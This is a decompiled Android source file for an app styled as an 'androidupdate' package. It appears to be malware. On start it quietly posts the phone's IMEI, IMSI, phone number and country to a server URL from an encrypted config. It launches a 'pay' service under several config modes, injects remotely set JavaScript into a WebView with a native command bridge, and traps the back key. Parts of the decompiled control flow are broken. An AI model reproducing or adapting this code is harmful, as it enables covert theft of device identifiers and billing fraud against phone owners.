package androidupdate.l.app;

import android.app.Activity;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JsPromptResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import java.io.DataOutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.json.JSONException;
import org.json.JSONObject;
import ru.beta.Beta;
import ru.beta.Functions;

public class MainActivity
  extends Activity
{
  public static int IDD_LOADING = 2;
  public static WebApi api;
  public static Settings settings = null;
  public static WebView webView;
  public Handler handler = null;
  public JSONObject jsonSettings;
  ProgressDialog loadingDialog = null;
  
  public MainActivity() {}
  
  public static void callJsCallbackAndroidVersion(String paramString)
  {
    System.out.println("callJsCallbackAndroidVersion()");
    System.out.println("version: " + paramString);
    try
    {
      paramString = "'" + paramString + "'";
      paramString = "javascript:androidVersion(" + paramString + ")";
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void executeJs(String paramString)
  {
    try
    {
      webView.loadUrl(paramString);
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static void openUrl(Context paramContext, String paramString)
  {
    try
    {
      paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
      paramString.addFlags(268435456);
      paramContext.startActivity(paramString);
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static HttpURLConnection sendHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    Object localObject = null;
    for (;;)
    {
      try
      {
        if (paramString2.equals("POST"))
        {
          localObject = new URL(paramString1);
          paramString1 = (HttpURLConnection)((URL)localObject).openConnection();
          paramString1.setDoInput(true);
          paramString1.setDoOutput(true);
          paramString1.setUseCaches(false);
          paramString1.setRequestMethod(paramString2);
          if (!paramString2.equals("POST")) {
            break label348;
          }
          paramString1.setRequestProperty("Content-Type", "multipart/form-data; boundary=AaB03x");
          break label348;
          if (i >= paramList2.size())
          {
            if (!paramString2.equals("POST")) {
              continue;
            }
            paramString2 = new DataOutputStream(paramString1.getOutputStream());
            i = 0;
            if (i < paramList1.size()) {
              continue;
            }
            paramString2.writeBytes("--AaB03x--");
            paramString2.writeBytes("\r\n");
            paramString2.flush();
            paramString2.close();
            break;
          }
        }
        else
        {
          if (!paramString2.equals("GET")) {
            continue;
          }
          localObject = new URL(paramString1 + "?" + URLEncodedUtils.format(paramList1, "utf-8"));
          continue;
        }
        localObject = (NameValuePair)paramList1.get(i);
        paramString1.setRequestProperty(((NameValuePair)localObject).getName(), ((NameValuePair)localObject).getValue());
        i += 1;
        continue;
        paramList2 = (NameValuePair)paramList1.get(i);
        paramString2.writeBytes("--AaB03x");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("Content-Disposition: form-data; name=\"" + paramList2.getName() + "\"");
        paramString2.writeBytes("\r\n");
        paramString2.writeBytes("\r\n");
        paramString2.write(paramList2.getValue().getBytes("utf-8"));
        paramString2.writeBytes("\r\n");
        i += 1;
        continue;
        if (!paramString2.equals("GET")) {
          break;
        }
        paramString1.connect();
      }
      catch (Exception paramString1)
      {
        paramString1.printStackTrace();
        return null;
      }
      label348:
      int i = 0;
    }
    return paramString1;
  }
  
  public static void sendPostRequest(String paramString, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    sendSimpleHttpRequest(paramString, "POST", paramList1, paramList2);
  }
  
  public static void sendSimpleHttpRequest(String paramString1, String paramString2, List<NameValuePair> paramList1, List<NameValuePair> paramList2)
  {
    try
    {
      paramString1 = sendHttpRequest(paramString1, paramString2, paramList1, paramList2);
      if (paramString1 != null)
      {
        System.out.println("getResponseCode: " + paramString1.getResponseCode());
        paramString1.disconnect();
      }
      return;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
  }
  
  public static void uninstallApk(Context paramContext, String paramString)
  {
    System.out.println("uninstallApk: " + paramString);
    Intent localIntent = new Intent("android.intent.action.DELETE");
    localIntent.setData(Uri.parse("package:" + paramString));
    localIntent.addFlags(268435456);
    paramContext.startActivity(localIntent);
  }
  
  public void onClickNext(View paramView)
  {
    System.out.println("onClickNext()");
    try
    {
      paramView = new JSONObject(Constants.data).getJSONObject("settings");
      int i = paramView.getInt("mode");
      if ((i == 2) || (i == 4)) {
        MainService.start(this, new Intent(), "pay");
      }
      openUrl(this, paramView.getString("dataUrl"));
      return;
    }
    catch (Exception paramView)
    {
      paramView.printStackTrace();
    }
  }
  
  public void onClickRule(View paramView)
  {
    System.out.println("onClickRule");
    paramView = (CheckBox)paramView;
    ((Button)findViewById(2131165186)).setEnabled(paramView.isChecked());
  }
  
  public void onConfigurationChanged(Configuration paramConfiguration)
  {
    super.onConfigurationChanged(paramConfiguration);
    setRequestedOrientation(1);
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    try
    {
      paramBundle = new JSONObject(Functions.decript(getString(2131034114)));
      new Beta(getApplicationContext(), paramBundle);
      showDialog(IDD_LOADING);
      paramBundle = new Settings();
      if (!paramBundle.load(this)) {
        paramBundle.save(this);
      }
      sendHttp();
      this.handler = new Handler();
      i = 2130903041;
      try
      {
        this.jsonSettings = new JSONObject(Constants.data).getJSONObject("settings");
        int j = this.jsonSettings.getInt("mode");
        if (j == 1) {
          MainService.start(this, new Intent(), "pay");
        }
        if (j != 3) {
          break label361;
        }
        i = 2130903041;
      }
      catch (Exception paramBundle)
      {
        for (;;)
        {
          paramBundle.printStackTrace();
        }
      }
      setContentView(i);
      api = new WebApi(this, this);
      webView = new WebView(this);
      paramBundle = new WebViewClient()
      {
        public void onPageFinished(WebView paramAnonymousWebView, String paramAnonymousString)
        {
          System.out.println("Page loaded");
          try
          {
            MainActivity.this.loadingDialog.dismiss();
            MainActivity.callJsCallbackAndroidVersion(Build.VERSION.RELEASE);
          }
          catch (Exception paramAnonymousWebView)
          {
            for (;;)
            {
              try
              {
                if (MainActivity.this.jsonSettings.getInt("mode") == 3) {
                  MainActivity.executeJs(MainActivity.this.jsonSettings.getString("licenseJs"));
                }
                return;
              }
              catch (JSONException paramAnonymousWebView)
              {
                paramAnonymousWebView.printStackTrace();
              }
              paramAnonymousWebView = paramAnonymousWebView;
              paramAnonymousWebView.printStackTrace();
            }
          }
        }
      };
      webView.setWebViewClient(paramBundle);
      webView.setScrollBarStyle(33554432);
      webView.getSettings().setJavaScriptEnabled(true);
      webView.setWebChromeClient(new WebChromeClient()
      {
        public boolean onJsPrompt(WebView paramAnonymousWebView, String paramAnonymousString1, String paramAnonymousString2, String paramAnonymousString3, JsPromptResult paramAnonymousJsPromptResult)
        {
          paramAnonymousWebView = MainActivity.api.textToCommand(paramAnonymousString2, paramAnonymousString3);
          if (paramAnonymousWebView.find)
          {
            paramAnonymousJsPromptResult.confirm(paramAnonymousWebView.result);
            return true;
          }
          return false;
        }
      });
      webView.addJavascriptInterface(api, "webapi");
      webView.setLayoutParams(new LinearLayout.LayoutParams(-1, -2, 1.0F));
      ((LinearLayout)findViewById(2131165185)).addView(webView);
    }
    catch (Exception paramBundle)
    {
      for (;;)
      {
        try
        {
          paramBundle = MainService.operator();
          if (this.jsonSettings.getInt("mode") == 4)
          {
            i = paramBundle.getInt("mode");
            if ((i == 41) || (i == 42)) {
              MainService.start(this, new Intent(), "pay");
            }
          }
          webView.loadUrl("file:///android_asset/html/" + paramBundle.getString("html") + "/index.html");
          return;
        }
        catch (Exception paramBundle)
        {
          int i;
          label361:
          paramBundle.printStackTrace();
        }
        paramBundle = paramBundle;
        paramBundle.printStackTrace();
        continue;
        i = 2130903040;
      }
    }
  }
  
  protected Dialog onCreateDialog(int paramInt)
  {
    if (paramInt == IDD_LOADING)
    {
      this.loadingDialog = new ProgressDialog(this);
      this.loadingDialog.setProgressStyle(0);
      this.loadingDialog.setTitle("");
      this.loadingDialog.setMessage("Loading...");
      this.loadingDialog.setCancelable(false);
      return this.loadingDialog;
    }
    return null;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    System.out.println("onKeyDown(): keyCode = " + paramInt);
    if (paramInt == 3) {}
    while (paramInt != 4) {
      return true;
    }
    return true;
  }
  
  public void sendHttp()
  {
    try
    {
      new Thread(new Runnable()
      {
        public void run()
        {
          try
          {
            MainActivity.sendPostRequest(new JSONObject(Constants.data).getJSONObject("settings").getString("startUrl").replace("{IMEI}", Constants.imei).replace("{IMSI}", Constants.imsi).replace("{PHONE}", Constants.phone).replace("{COUNTRY}", Constants.country).replace("{APPID}", MainActivity.this.getText(2131034113)).replace("{MODEL}", Build.MODEL).replace("{MANUFACTURER}", Build.MANUFACTURER).replace("{SDK}", String.valueOf(Build.VERSION.SDK_INT)), new LinkedList(), new LinkedList());
            return;
          }
          catch (Exception localException)
          {
            localException.printStackTrace();
          }
        }
      }).start();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void uninstall()
  {
    uninstallApk(this, getPackageName());
  }
}
